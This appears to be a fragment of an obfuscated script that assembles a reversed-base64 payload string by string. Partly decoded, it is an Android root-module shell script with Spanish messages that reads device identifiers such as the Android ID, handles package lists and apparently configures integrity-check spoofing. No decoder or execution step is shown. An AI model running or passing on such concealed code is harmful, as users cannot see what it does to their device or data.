+_c+='pBCIgAiCi0nT7RSflxmYp52bwNXakBybu1iOEl0XEl0TSRkTBtHJ9d1ekAiOElEIkl2byRmbBBSX'
+_c+='qsVfCtHJiACd1BHd192Xn9GbgACIgoQKn4GXyx1JgQWLgIHdgwHIiwGb152L2VGZv4jMgQWafRWa'
+_c+='vJHZuFGIlJXdjV2cgQXZnBycn5Wa0RXZzJCIsxWZoNHIiRWYoQSPEl0XEl0TSRkTBBCIgAiCKATP'
+_c+='G90TQN1XE5UVPZEIgACIKIiTBJEIFREION5wJNVQWVEIvAyROlkRP9EUTBSRDlkVFRkIgIHZo91Y'
+_c+='lNHIgACIKsHIpgiZv9Gcz9VZjlmdlR2XrNWZoNmCK0nCiICIvh2YlBCIgAiCi0nT7RCZ05WZ2VWd'
+_c+='g4WZgMXYtOMbh12buFGIul2Ug01kcK+W9d0ekICI0VHc0V3bfd2bsBiJmASXgADIxVWLgQmb19mZ'
+_c+='fRCIbBCIgAiCKkmZgACIgoQamBCIgACIgACIKISfOtHJsFWby9mbgQ3bvJHIElUVgoDZ05WZ2VWd'
+_c+='g01kcK+W9d0ekICI0VHc0V3bfd2bsBCIgACIgACIgACIgoQZzxWZgACIgACIgAiCx0DZuV3bm9FI'
+_c+='7kSKz0zKU5UVPN0XTV1TJNUSQNVVThCKgACIgACIgACIgACIKISfOtHJklWdfRCI68GZhJXZwNXZ'
+_c+='ulGIElUVg42bjBybk5WZpJncvNGIkRnblZXZ1BSXhsVfStHJiACd1BHd192Xn9GbgACIgACIgACI'
+_c+='gACIK4WZoRHI70FIiQWa19FJiAibtAyWgYiJg0FIiQ3bvJnIg0TIgICZpV3XkICIbBiZpBCIgACI'
+_c+='gACIKkSMtACZhVGagwHIn0XMkACdulmcwt3Jgs2dhBCfgICZpB3XkRnblZXZ19FJiAyboNWZoQSP'
+_c+='klWdfBCIgACIgACIKQWa19FIsF2YvxGIgACIgACIgogblhGdgsTXgICZpB3XkRnblZXZ19FJiAib'
+_c+='tAyWgYWagACIgoQKnIHXnACZtAic0BCfgICclJ3ZgYXLgAXZydGI8BCZ05WZ2VWdgcXLgAXZydGI'
+_c+='8BCbsVnbvYXZk9iPyASQtAycwJCIsxWZoNHIiRWYoQSPklGcfRGduVmdlV3XgACIgoAZpB3XkRnb'
+_c+='lZXZ19FIsF2YvxGIgACIKoQamBCIgAiCx0DZuV3bm9FIgACIgACIgoQZu9GZgACIgACIgAiCx0DZ'
+_c+='uV3bm9FI7kSK00zKU5UVPN0XTV1TJNUSQNVVThCKgACIgACIgACIgACIKIidlR2LgEWrDbHIvdWa'
+_c+='kN7wjBichR3YllnbpBSYyFGcgMHdhVGajBycv5WdnxWYgI3bwBybkF2c1BClAKOIzVGZv5GIlNWa'
+_c+='2VGZgIXYlJ3YgEmchBHIzVGb1JHIt9GdzV3YgE2YpRmbpBSY0FGZvAiblBCZ05WZ2VWdiACe0N2X'
+_c+='gACIgACIgACIgACIKISfOtHJm9FJgoTKvxWYtN7wuFGKgEGdhR2Lg4WZgQGduVmdlVHIdFyW9J1e'
+_c+='kICI0VHc0V3bfd2bsBCIgACIgACIgACIgoQZ15Wa052bjBiJmASXgIiZfRiIgoXLgsFIgACIgACI'
+_c+='gACIgAiCvRGI7Y2XgIXLgQWYlJHI9MlRJBSZslGa3BCfgISY0FGZfRGduVmdlV3XkICIvh2YlBCI'
+_c+='gACIgACIK4WZoRHI70FIikyJdpTZjFGczpzWnACZtAic0BCfgISY0FGZfRGduVmdlV3XkICIvh2Y'
+_c+='lhCJiAibtAyWgYWagACIgoQKnIHXnACZtAic0BCfgISNtACZhVGagwHIsxWdu9idlR2L+IDInoCZ'
+_c+='05WZ2VWdnASZtFmbtASY0FGZvACZulmZiACbsVGazBiYkFGKk0TY0FGZfRGduVmdlV3XgACIgoQY'
+_c+='0FGZfRGduVmdlV3XgwWYj9GbgACIgogCpZGIgACIKETPk5WdvZ2XgACIgACIgAiCl52bkBCIgACI'
+_c+='gACIKETPk5WdvZ2XgsTKpMTPrQlTV90QfNVVPl0QJB1UVNFKoACIgACIgACIgACIgogI950ekY2X'
+_c+='kAiOvN3boNWZwN3bzBCbh52bpNWakFGIkRnblZXZ1Byb2lGajJXQg0VIb1nU7RiIgQXdwRXdv91Z'
+_c+='vxGIgACIgACIgACIgAiClVnbpRnbvNGImYCIdBiIm9FJiAietAyWgACIgACIgACIgACIK8GZgsjZ'
+_c+='fBictACZhVmcg0zUGlEIlxWaodHI8BiIhJHd4V2XkRnblZXZ19FJiAyboNWZgACIgACIgAiCuVGa'
+_c+='0ByOdBiIhJHd4V2XkRnblZXZ19FJiAibtAyWgYWagACIgoQKnIHXnACZtAic0BCfgIyJkMmcuQGd'
+_c+='uVmdlV3LjRXZv0WZ0NXez9iXnAidtACclJ3ZgwHIsxWdu9idlR2L+IDInMmcuoCZ05WZ2VWdnASZ'
+_c+='tFmbtAyY0V2LtVGdzl3cvACZulmZiACbsVGazBiYkFGKk0TYyRHel9FZ05WZ2VWdfBCIgAiChJHd'
+_c+='4V2XkRnblZXZ19FIsF2YvxGIgACIKkyJyx1JgQWLgIHdgwHIiwGb152L2VGZv4jMgMmcuQGduVmd'
+_c+='lV3LjRXZv0WZ0NXez9CIhxWLgMHbiACbsVGazBiYkFGKk0DZv12XkRnblZXZ19FIgACIKQ2bt9FZ'
+_c+='05WZ2VWdfBCbhN2bsBCIgAiCKATPk5WdvZ2XgwWYj9GbgACIgogITRlTFZVRgwUROJVRLByLgQEV'
+_c+='OVkVFVlIgIHZo91YlNHIgACIKsHIpgCZ05WZ2VWdft2Ylh2YKoQfKIiIg8GajVGIgACIKISfOtHJ'
+_c+='vRWY0NWZ0VGZgMFUHBSZrFmRg4WaTBSXTyp4b13R7RiIgQXdwRXdv91ZvxGImYCIdBCMgEXZtACZ'
+_c+='uV3bm9FJgsFIgACIKoQamBCIgAiCx0DZuV3bm9FI7kSKy0zKU5UVPN0XTV1TJNUSQNVVThCKgACI'
+_c+='gACIgAiCi0nT7RCcwF2XrN2bt9FJgozb2lGdjFGIu9Wa0F2YvxEIrN2bNBybzlWbyVGcg42bjBCc'
+_c+='wFEIdFyW9J1ekICI0VHc0V3bfd2bsBCIgACIgACIK4WZoRHI70FIiAHch91aj9WbfRiIg4WLgsFI'
+_c+='mlGIgACIKkyMtACZhVGagwHIiMnbvlGdhJXZw9GIv5mIgkmdtACclJ3ZgwHInQiXnAidtACclJ3Z'
+_c+='gwHInIHXnACZtAic0BCfgICbsVnbvYXZk9iPyAydvxGbhBibvlGdhN2bs91aj9Wb6QWavJHZuFGI'
+_c+='w9WL5JXZ1FHIzB3bwBXYiACbsVGazBiYkFGKk0DcwF2XrN2bt9FIgACIKAHch91aj9WbfBCbhN2b'
+_c+='sBCIgAiCKkmZgACIgoQM9Qmb19mZfByOpkiM9sCVOV1TD91UV9USDlEUTV1UogCIgACIgACIgogI'
+_c+='vZXa0l2cvB3cpRGIsVGZgwWYlJHITB1Rg42sDn2YhNWaiVHIhxGIyFmehxGctVWZyBCcwFGIyVWa'
+_c+='1FHbhV3YgEGIlRXatJXZwBSYtVGdzl2cgUGZgwWZ2lmbgEGIu9Wa0F2YvxEIrN2bNJCI4R3YfBCI'
+_c+='gACIgACIKISfOtHJh1WZ0NXazBCblRGIuN7wpNWYyV3ZpZmbvNGIuVGIvRWY2lGdjFGIu9Wa0F2Y'
+_c+='vxEIrN2bNBSXhsVfStHJiACd1BHd192Xn9GbgACIgACIgAiCuVGa0ByOdBiIxICI9AiIrN2bt9FJ'
+_c+='iAyWgYWagACIgoQKnIHXnACZtAic0BCfgICbsVnbvYXZk9iPyAibvlGdhN2bs91aj9WbgUmc1NWZ'
+_c+='zBCdldGIzdmbpRHdlNnIgwGblh2cgIGZhhCJ9s2Yv12XgACIgowaj9WbfBCbhN2bsBCIgAiCKkmZ'
+_c+='gACIgoQM9Qmb19mZfBCIgACIgACIKUmbvRGIgACIgACIgoQM9Qmb19mZfByOpkyM9sCVOV1TD91U'
+_c+='V9USDlEUTV1UogCIgACIgACIgACIgAiCiM3b05Wa0NXakByclJ3bklmdyV2cgEGIyVGZlN2YhByb'
+_c+='g42sDn2ZlJHIy9GcgMnbhJGIylGZhZXZgEmchBHIvRWYzVHIUCo4g42sDn2YhNWaiVHIlRGIzFGZ'
+_c+='h5WZkJ3bvNGIhNWaml2csFmZgMFUHBSZrFmRiACe0N2XgACIgACIgACIgACIKISfOtHJntGcfRCI'
+_c+='6EGZhR3YlRXZkByUQdEIltWYGBSZkBCcwFEIdFyW9J1ekICI0VHc0V3bfd2bsBCIgACIgACIgACI'
+_c+='goQZ15Wa052bjBiJmASXgIyZrB3XkICI61CIbBCIgACIgACIgACIgowbkByOntGcfBictACZhVmc'
+_c+='g0zUGlEIlxWaodHI8BiIzd2aw91cwd2XkICIvh2YlBCIgACIgACIK4WZoRHI70FIiM3ZrB3XzB3Z'
+_c+='fRiIg4WLgsFImlGIgACIKkyJyx1JgQWLgIHdgwHIiMHcnV2ahZmL09Gczd2bsJGfzB3ZltWYm5ic'
+_c+='v1mbpV2a8NHcnV2ahZmL2VmclRXeix3cwdmLltWYm5SYs9Ga8JXZm92bwNnLzB3Z8Z2bvB3cu42b'
+_c+='pRXYj9Gb852bpRXYj9Gbus2Yv1GfzB3ZltWYmx3UQdUZrFmZu02bj5ycwBXYlRXYy9Gcy92YulGf'
+_c+='zB3ZltWYm5SY4VGb8t2YpR3c59mauMHcnx3cwdWZrFmZiACIgACIgACIgUUatACclJ3ZgwHIiUES'
+_c+='DF0Qfd0SQRiIg8GajVGKk0zcntGcfNHcn9FIgACIKM3ZrB3XzB3ZfBCbhN2bsBCIgAiCw0DZuV3b'
+_c+='m9FIsF2YvxGIgACIKIyROlkRP9EUTBiTPlEVBN0TMByLgMFUHBSRLFkRiAickh2XjV2cgACIgowe'
+_c+='gkCKzB3ZltWYm91ajVGajpgC9pgIiAyboNWZgACIgogI950ekgXaGBSe0lmcnVGdulEI5FGbQBib'
+_c+='pNFIdNJnivVfHtHJiACd1BHd192Xn9GbgYiJg0FIwAScl1CIGlEUfRkTV9kRkAyWgACIgogCpZGI'
+_c+='gACIKkSKrsCVOV1TD91UV9USDlEUTV1UogCI7ISfOtHJnVnYlRGIvR2btBiblByb2lGdpN3bwNXa'
+_c+='kBClAKOIx0TZsJWYndWdiVGZu8mcg0VIb1XW7RiIgQXdwRXdv91ZvxGIgACIgACIgogblhGdgsTX'
+_c+='gISMiASPgISRMJUQHdUVCVERkICIbBiZpBCIgAiCpciccdCIk1CIyRHI8BiIsxWdu9idlR2L+IDI'
+_c+='lxmYhd2Z1JWZk5ybyBCcvJHc0V2ZiACbsVGazBiYkFGKk0TRMJUQHdUVCVERgACIgogCpZGIgACI'
+_c+='KETPGlEUfRkTV9kRgsTKpMTPrQlTV90QfNVVPl0QJB1UVNFKoACIgACIgACIKIyRO9kUUNFI5RXa'
+_c+='ydWZ05WSgkXYsBFIvNXdsNmbpBSYyVGc1NHIUCo4gM3bzxWYmBibvlGdhR3clRHdBlXZLBycvRWY'
+_c+='jlmZpRnclNGIhJXZuV2ZgUmcvR3U5t2YpJHViACe0N2XgACIgACIgAiCi0nT7RySDlkUURCI6kCZ'
+_c+='hRWaydWZ05WagUGZgM3chBXeihCIlJ3b0NVerNWayRFIdFyW9J1ekICI0VHc0V3bfd2bsBCIgACI'
+_c+='gACIK4WZoRHI70FIis0QJJFVkICIu1CIbBiZpBCIgAiCpciccdCIk1CIyRHI8BiIrNWayRHIp1CI'
+_c+='wVmcnBCfgwGb152L2VGZv4jMgMXZsVHZv12LiRWYvEGdhR2LgMHbiACbsVGazBiYkFGKk0zSDlkU'
+_c+='UBCIgAiCKkmZgACIgoQM9YUSQ9FROV1TGByOpkyM9sCVOV1TD91UV9USDlEUTV1UogCI7ISfOtHJ'
+_c+='E9UTfZUSQRCI6s2cpdWYNBiblBiRJBFIvxWdkN7wNBSXhsVfStHJiACd1BHd192Xn9GbgACIgACI'
+_c+='gAiCuVGa0ByOdBiIE9UTfZUSQRiIg4WLgsFImlGIgACIKkyJyx1JgQWLgIHdgwHIicCdpJ3ZlRnb'
+_c+='pxnZpBHf5RXaydWZ05Wa5FGbwdCIFlWLgAXZydGI8BCbsVnbvYXZk9iPyAyclxWdk9WbvIGZh9SY'
+_c+='0FGZvAycsJCIsxWZoNHIiRWYoQSPE9UTfZUSQBCIgAiCKUmbvRGIgACIKkmZgACIgACIgAiCx0jR'
+_c+='JB1XE5UVPZEI7kSKz0zKU5UVPN0XTV1TJNUSQNVVThCKgACIgACIgACIgACIKIybnVWdqBCbhByb'
+_c+='kFWZ1F3bsJ2clRGIyVGZh9Gb092biBSegQ3bvJHIhRHb1N2bgQJgiDSSQFEI5RXaydWZ05WSgkXY'
+_c+='sBFIlRGIhR3clVHczVmcgEGbgE2YpZWazxWYmBiRJBlIggHdj9FIgACIgACIgACIgAiCi0nT7RyZ'
+_c+='rBHJgozbkFGbhR3culGI4lmRgkHdpJ3ZlRnbJBSehxGUg0VIb1nU7RiIgQXdwRXdv91ZvxGIgACI'
+_c+='gACIgACIgAiCuVGa0ByOic2awRiIgEXLgAXZydGI8BiIGlEUfR1UJx0XHtEUkICIvh2YlBiZpBCI'
+_c+='gACIgACIK8GZgsjI4lmZ5RXaydWZ05Wa5FGbw5CM2AjMiZnduIWdoRXan5ybpJCIigXamlHdpJ3Z'
+_c+='lRnbplXYsBnLuFWbvJXZ0lGaj5SbvNmIgICepZWe0lmcnVGdulWehxGcu4WYt9mclRXaoNmLzVmI'
+_c+='g4Wagc2awBicvZGIgACIKISRINUQD91RLBFJi0jRJB1XUNVSM91RLBFIgACIKoAM9YUSQ9FROV1T'
+_c+='GBCIgAiCiQUQElkUHVEVOlEIFREIG90TQNFIvACWJZEIZRVSSdURU5USgkVQMBlIgIHZo91YlNHI'
+_c+='gACIKsHIpgiZpB3XrNWZoNmCK0nCiICIvh2YlBCIgAiCpZGIgACIKISfOtHJhZXa0NWYgE2YpRXo'
+_c+='D32b0VXYgEmcvhEIdNJnivVfHtHJiACd1BHd192Xn9GbgACIgACIgAiClNHblBCIgAiCpkiM9sCV'
+_c+='OV1TD91UV9USDlEUTV1UogCIgACIgACIgogIh1WZ0NXazBCblRGIvBXbllGdgwWZgIXZkV2YvJHd'
+_c+='lJHIvBichxWZn52bjBSYyFGcgUGduVWbsFWduFWbgo2bsVmcgwWZgIXY0NXdqFGIlRXatJXZwByb'
+_c+='kFmdpR3YhNXZkBCUU5kIggHdj9FIgACIgACIgogI950ekMHctFGdzVWbpRHIlRGIuN7wpNWYsVHc'
+_c+='p5WYtBSY0lGbpNWYmBClAKOIBRUQWlEVDF0UFREIhNWa0F6wt9Gd1FGIhJ3bIBSXhsVfStHJiACd'
+_c+='1BHd192Xn9GbgACIgACIgAiCuVGa0ByOdBiIwICI9AiIF1USU91TUVVQkICIbBiZpBCIgAiCi0nT'
+_c+='7RSfhRWaj9mbvN2clRWL6UkTPpVRNlEV7RSfXtHJgAiOhlmchJ3boBSYu9mWg0lKb1nQ7RiIgQXd'
+_c+='wRXdv91ZvxGIgACIKISfOtHJ99GZpN2bu92YzVGZtojWU91TUVVQ7RSfXtHJ6Umbvp3Xl1Wa091b'
+_c+='0VXYg0lKb1nQ7RiIgQXdwRXdv91ZvxGIgACIKISfOtHJ99GZpN2bu92YzVGZtoTRNlEVf9EVVF0e'
+_c+='k03V7RCIgACIgoTZtlGdf9Gd1FGIdpyW9J0ekICI0VHc0V3bfd2bsBCIgAiCpciccdCIk1CIyRHI'
+_c+='8BiIsxWdu9idlR2L+IDIl52b6VWbpRnLzl3cuQ3cpNnclBHIw9mcwRXZnJCIsxWZoNHIiRWYoQSP'
+_c+='F50TaVUTJRFIgACIKkyJyx1JgQWLgIHdgwHIiwGb152L2VGZv4jMgUmbvp3Xl1Wa091b0VXYgwWY'
+_c+='i9GbnBCdldGIzdmbpRHdlNnIgwGblh2cgIGZhhCJ9oFVf9EVVFEIgACIKkyJyx1JgQWLgIHdgwHI'
+_c+='iwGb152L2VGZv4jMgUWbpR3XvRXdhBCbhJ2bsdGI0V2ZgM3ZulGd0V2ciACbsVGazBiYkFGKk0TR'
+_c+='NlEVf9EVVFEIgACIKISQS9ESvEESDVkRgUERg40kDn0QBJVVHlkRO90QiAickh2XjV2cgACIgowe'
+_c+='gkCKl1Wa091b0VXYft2Ylh2YKoQfKIiIg8GajVGIgACIKkmZgACIgoQZu9GZgsjI950ekUmbpxGJ'
+_c+='gASfZtHJiACd1BHd192Xn9Gbg8GZgsTZulGbgIXLgQWYlJHIlxWaodHI8BiIN9EVOFESQRiIg8Ga'
+_c+='jVGIgACIgACIgogI950ekoTKz9GZhRXYtBycvNXZj9mcwhCIkJ3bjVmUzNXZj9mcQ12b05WYoBFI'
+_c+='dFyW9l1ekICI0VHc0V3bfd2bsBCIgACIgACIK4WZoRHI70FIi00TU5UQIBFJiAibtAyWgYWagACI'
+_c+='goQKz0CIslWY0BCfgICZy92YlJ1czV2YvJHUt9GduFGaQJCIwVmcnBCfgISRINUQD91RPxEJiAyb'
+_c+='oNWZoQSPN9EVOFESQBCIgAiCpZGIgACIKISfOtHJz9GZpRXZwVmcgMXZoNXYyNGIul2Ug01kcK+W'
+_c+='9d0ekICI0VHc0V3bfd2bsBCIgACIgACIKU2csVGIgACIKkSKrsCVOV1TD91UV9USDlEUTV1UogCI'
+_c+='gACIgACIgoQZu9GZgsjI950ekUmbpxGJgASfZtHJiACd1BHd192Xn9GbgYiJg0FIiUmbpxGJiAib'
+_c+='tAyWg8GZgsTZulGbgIXLgQWYlJHIlxWaodHI8BiITVESTFkUDRiIg8GajVGIgACIgACIgogI950e'
+_c+='kozcvRWa0VGclJHIzVGazFmcDBSXhsVfZtHJiACd1BHd192Xn9GbgACIgACIgAiCuVGa0ByOdBiI'
+_c+='pcSX6U2YhB3c6s1JgQWLgIHdgwHIiMVRINVQSNEJiAyboNWZoQiIg4WLgsFImlGIgACIKkyJyx1J'
+_c+='gQWLgIHdgwHInUTLgQWYlhGI8ByJiciIn0nMkICI4BiIxQCI05WayB3ez0jPxQyJiciInAya3FGI'
+_c+='8Biby1CI0J3bzBCfgMWLgEXauVHI8BCdy92cgwHIi8yLpMXZ0lnYgoSX50CMbhCIvMnIgQWZzBCf'
+_c+='gIyLvASX50CMb1VOtAzW60VOtAzWdlTLwslOdlTLwsVX50CMbpiLvMnIgQWZzBCfgIiclZnclN3X'
+_c+='tVGdzl3c8VkTPR1UC10TUxHazFmcj9VZ2lGdh5mIgUULgAXZydGI8BCbsVnbvYXZk9iPyACevJGc'
+_c+='vJHZgMXezBXb1R2JgwGblh2cgIGZhhCJ9MVRINVQSNEIgACIKISKY9kQQ9kUEhCIT90UPh0QFB1U'
+_c+='PNFITVESTFkUDJCIyRGafNWZzBCIgAiC7BSKoMXZoNXYyN2X49mYw9mck91ajVGajpgC9pgIiAyb'
+_c+='oNWZgACIgoQamBCIgAiCi0nT7RybtO8YhZHIw1GdvwWYj9GbvEGdhR2Lg01kcK+W9d0ekICI0VHc'
+_c+='0V3bfd2bsBCIgACIgACIKU2csVGIgACIKkSKrsCVOV1TD91UV9USDlEUTV1UogCIgACIgACIgoQZ'
+_c+='u9GZgACIgACIgAiCpZGIgACIgACIgACIgAiCpkyKrQlTV90QfNVVPl0QJB1UVNFKoAyOi0nT7RyT'
+_c+='T9ESDVEUT90Ug4FIgACI9J1ekICI0VHc0V3bfd2bsBCIgACIgACIgACIgACIgAiCuVGa0ByOiQnb'
+_c+='lZXZyJGf1tWd6lGazx3czFGc5JGfrNWYoxHdhVGajxHdjVmaulGfr92boxXYklmcmJCIFlWctACc'
+_c+='lJ3ZgwHIiYGJiAyboNWZgYWagACIgACIgACIgACIKISfOtHJmRCIg0XW7RiIgQXdwRXdv91ZvxGI'
+_c+='gACIgACIgACIgAiClVnbpRnbvNGImYCIdBiImRiIgoXLgsFIgACIgACIgACIgAiCvRGI7YGIy1CI'
+_c+='kFWZyBSZslGa3BCfgIyUFxUSG9FUNRFJiAyboNWZgACIgACIgAiCi0nT7RiOw1GdvwWYj9GbvEGd'
+_c+='hR2Lg4WZgM3b2lGajJXQg0VIb1XW7RiIgQXdwRXdv91ZvxGIgACIgACIgogblhGdgsTXgISKn0lO'
+_c+='lNWYwNnObdCIk1CIyRHI8BiITVETJZ0XQ1EVkICIvh2YlhCJiAibtAyWgYWagACIgoQamBCIgAiC'
+_c+='pZGIgACIgACIgoQKpITPrQlTV90QfNVVPl0QJB1UVNFKoACIgACIgACIgACIgoQKiUGduVWblRnb'
+_c+='ll2YlJHIvRWYpBXbpxGIw1GdigSPrM1TWlEVP1EIgACIgACIgACIgAiCi0nT7RSZtlGdt9FctR3X'
+_c+='kAiOuN7wpNWYjlmZpR2btBSYtlGdsp5wgACIg0XW7RiIgQXdwRXdv91ZvxGIgACIgACIgACIgAiC'
+_c+='iEGduVWatFmcyVGagUGZgEGbsVWdoBClAKOIuF2YzBCblRGIzVGduFGIzFGduVWatFmcyVGag8GI'
+_c+='zRWYvxWehBHIzOsbp1WasVGIvlmchV3c1BCblBSZ1FHIhNWak5WagEGZpRnchBXL0N3bwBCctRHI'
+_c+='lRGIhpXZpBXbpxkIggHdj9FIgACIgACIgACIgAiCi0nT7RycvJHdzFmcgUGZgEmellGctlGbgUGb'
+_c+='il2cvBHIUCo4g8WrDPWY2BybyVGcgUGduVWblRnbll2YlJHIvRWYjlmZpR2btBCctR3LsF2Yvx2L'
+_c+='hRXYk9CIdFyW9J1ekICI0VHc0V3bfd2bsBCIgACIgACIgACIgogblhGdgsTXgISZnF2Xw1GdfRiI'
+_c+='g4WLgsFImlGIgACIgACIgoQKnIHXnACZtAic0BCfgICbsVnbvYXZk9iPyACMz0CIulWbt1CIl1Wa'
+_c+='0BXdvM2byB3LgIXZ3VmbtACMggGdwVGZ4FWbtACctR3LsF2Yvx2LhRXYk9CIk5WamJCIsxWZoNHI'
+_c+='iRWYoQSPldWYfBXb09FIgACIgACIgogblhGdgsTXgISZtlGdt9FctR3XkICIu1CIbBiJmASXgISK'
+_c+='n0lOlNWYwNnObdCIk1CIyRHI8BiITVETJZ0XQ1EVkICIvh2YlhCJiAietAyWgYWagACIgoQKx0CI'
+_c+='kFWZoBCfgciccdCIk1CIyRHI8BiInknZpR2btxHX5ZWak9WTnASatACclJ3ZgwHIsxWdu9idlR2L'
+_c+='+IDIw1GdvwWYj9GbvEGdhR2LgQXY0NnIgwGblh2cgIGZhhCJ9UWbpRXbfBXb09FIgACIK8WrDPWY'
+_c+='2BSoDT3clBybyVGcgUGduVWblRnbll2YlJHIvRWYjlmZpR2btBSZ1ZGIw1GdvwWYj9GbvEGdhR2L'
+_c+='gk2cgIXY0NWZ0VGRgMCIgACIKkyJkQHe05CXzd2bs9lb39mbr5WdexHJ0hHduwlcvRXau9Wbf52d'
+_c+='v52auVnX8RyawFmLcJ3b0lmbv1WLud3butmb151JgUkdtACclJ3ZgwHInIHXnACZtAic0BCfgcSZ'
+_c+='u9GZgszYhNXZgszOi4GJiAyboNWZgYiJg0FIiYGJiASZtAyWgkiKgszOgkiIu4iIgwHIi4iIg4Wa'
+_c+='gIibkICIlNXYjByOi03LqMyImtHJi0jbg8GZgsjKu8CctR3LsF2Yvx2LhRXYk9CIq8CctR3LsF2Y'
+_c+='vx2LhRXYk9CIulGImBicvZ2JgwGblh2cgIGZhhCJ9MVRMlkRfBVTUBCIgAiCiAVTU9CTBN0TM9SQ'
+_c+='UFERvAiTFByUPZVSINkUBJCIyRGafNWZzBCIgAiC7BSKoAXb09FbhN2bs9VY0FGZft2Ylh2YKoQf'
+_c+='KIiIg8GajVGIgACIKkmZgACIgogI950ekEmdpR3YhBSYsxWY05WYwBSZkBSYyVHdwF2Yg4WaTBSX'
+_c+='Typ4b13R7RiIgQXdwRXdv91ZvxGIgACIgACIgoQZzxWZgACIgoQKpITPrQlTV90QfNVVPl0QJB1U'
+_c+='VNFKoACIgACIgACIKUmbvRGI7ISfOtHJl5WasRCIg0XW7RiIgQXdwRXdv91ZvxGImYCIdBiIl5Wa'
+_c+='sRiIg4WLgsFIvRGI7UmbpxGIy1CIkFWZyBSZslGa3BCfgIiSPJFUfFUSEVUTkICIvh2YlBCIgACI'
+_c+='gACIKISY2lGdjFGIv5mclRHelBSehxGclJHIlRGIhRnbllWbhJnclhGIUCo4g8mdpZHIuVGIuN7w'
+_c+='pNXatNnbhJHdg8GIuN7wpNWYiFmcnBSYjlGZulGIvdWZ1pGIsVGIlRnbhJXdkBSY2lGdjFGIu9Wa'
+_c+='0NWZq9mcQFWakVWTiACe0N2XgACIgACIgAiCi0nT7RiOBZVSUNUQgEETMFEVOFEUgUERgEkUVRFU'
+_c+='BNEIdFyW9J1ekICI0VHc0V3bfd2bsBCIgACIgACIK4WZoRHI70FIikyJdpTZjFGczpzWnACZtAic'
+_c+='0BCfgIiSPJFUfFUSEVUTkICIvh2YlhCJiAibtAyWgYWagACIgoQKnIHXnACZtAic0BCfgISNtACZ'
+_c+='hVGagwHInUmdpR3YhpiLu9Wa0NWZq9mcwxHZy92YlJnKuUGdhR3c8VWdyRXPn5WakJ3bjVmUzl2J'
+_c+='gUUatACclJ3ZgwHIsxWdu9idlR2L+IDIu9Wa0NWZq9mcw9VYpRWZtByc5NHctVHZiACbsVGazBiY'
+_c+='kFGKk0jSPJFUfFUSEVUTgACIgogIO9USUNURK9kUQBSQJRURNByLgEETMFEVOFEUgUERgEkUVRFU'
+_c+='BNkIgIHZo91YlNHIgACIKsHIpgibvlGdjVmavJHcfFWakVWbft2Ylh2YKoQfKIiIg8GajVGIgACI'
+_c+='KkmZgACIgogI950ekEmYpJnchBSZkBycvRnblZXZgM3bsBibvNGIvlmchJ3boBCblBSoDLXYw12b'
+_c+='jBClAKOIF1USU10XUNVRXVkTkAiOlRnbll2YlJHIzF6wtBSehxGclJFIdpyW9J0ekICI0VHc0V3b'
+_c+='fd2bsBiJmASXgISRNlEVN9FVTV0VF5EJiAibtAyWgACIgACIgAiCpZGIgACIgACIgoQKpMTPrQlT'
+_c+='V90QfNVVPl0QJB1UVNFKoACIgACIgACIgACIgogIhRWa0JXYwBSYsBich5WatJXZ0BSZkBycpOcd'
+_c+='wNXZkByb0NXdqBCdhVGajBSZkBycwBXYgIXYyJ3biBSYyFGcg4muD32bjBSYjlmbjl6w0BClAKOI'
+_c+='0F2Yn9Gbg4WZg8mc0NXYyBSZ0NXZgEmalRGIsxWY0Nnbp5Wdg0GcgwGblh2cgIGZhJCI4R3YfBCI'
+_c+='gACIgACIgACIgogI950ekMXZ0NXdqFEIlR2clRGIv5GIs8GZuFWbvNGIy9GcgEGZhRXdjVmalBCl'
+_c+='AKOIhRWY0NWZ0VGZgkCMwAjMoACbsVGaTBCRJVFIu92Yg42sDn2YhxWY0NnbpNXZEBSXhsVfStHJ'
+_c+='iACd1BHd192Xn9GbgACIgACIgACIgACIK4WZoRHI7cCbsVGazxHMwAjMnASRpFXLgAXZydGI8BiI'
+_c+='H9ETfxETBR1UOlkTVRiIg8GajVGImlGIgACIgACIgoQZu9GZgACIgACIgAiCi0nT7RSZtFmbntGc'
+_c+='fRCI6AHchBysGKOIgACI9l1ekICI0VHc0V3bfd2bsBiJmASXgISZtFmbntGcfRiIg4WLgsFIgACI'
+_c+='gACIgACIgAiCi0nT7RSZulGbkACI9d1ekICI0VHc0V3bfd2bsBCIgACIgACIgACIgoQKx0CIkFWZ'
+_c+='oBCfgcSfsIzepoSXflTLwoVLBpXLhtVXa1SQ61SYb5CXooSXflTLwoVLBpXLhtVXa1SQ61SYbdCI'
+_c+='F9WLgAXZydGI8BiIl5WasRiIg8GajVGKk0TZtFmbntGcfBCIgACIgACIgACIgoQZ15Wa052bjBiJ'
+_c+='mASXgISZulGbkICI61CIbBCIgACIgACIgACIgowbkByOl5WasBictACZhVmcgUGbph2dgwHIic0T'
+_c+='M9FTMFEVT5USOVFJiAyboNWZgACIgACIgAiCi0nT7RiOoRjMgMXYtlGdsp7wgMXYsBiblBycl52b'
+_c+='pNWYsFGdz5WazVGRg0lKb1XW7RiIgQXdwRXdv91ZvxGIgACIgACIgogblhGdgsTXgISKn0lOlNWY'
+_c+='wNnObdCIk1CIyRHI8BiIH9ETfxETBR1UOlkTVRiIg8GajVGKkICIu1CIbBiZpBCIgAiCpATMtACZ'
+_c+='hVGagwHInwGblh2cgIGZhxHdhN2ZvxGfkJGZhdCIFZXLgAXZydGI8ByJ29WblJHfsxWY0Nnbp5Wd'
+_c+='8RXZsVGZnASRp1CIwVmcnBCfgIyVBJ1XMxUQUNlTJ5UVkICIvh2YlhCJ9c0TM9FTMFEVT5USOVFI'
+_c+='gACIKkmZgACIgoQKnIHXnACZtAic0BCfgIyJyVGbsFGdz5WSldWYrNWYQxncldWYuFWTldWYrNWY'
+_c+='QdCIFlWLgAXZydGI8BCbsVnbvYXZk9iPyACMwAzMgQXLgQWLgUWbpRHI21CI0F2Yn9GbiACbsVGa'
+_c+='zBiYkFGKk0zVBJ1XMxUQUNlTJ5UVgACIgACIgAiClNHblBCIgAiCpciccdCIk1CIyRHI8BiInIXZ'
+_c+='sxWY0NnbJV2Zht2YhBFfyV2Zh5WYNV2Zht2YhB1JgUUatACclJ3ZgwHIsxWdu9idlR2L+IDInU2Y'
+_c+='ul2cfRyJgQVLgQWLgUWbpRHI21CI0F2Yn9GbiACbsVGazBiYkFGKk0zVBJ1XMxUQUNlTJ5UVgACI'
+_c+='gACIgAiCuVGa0ByOdBiIlNmbpN3XkICIu1CIbBiZpBCIgAiCpwGb152L2VGZv4jMgcCMwAjLTViO'
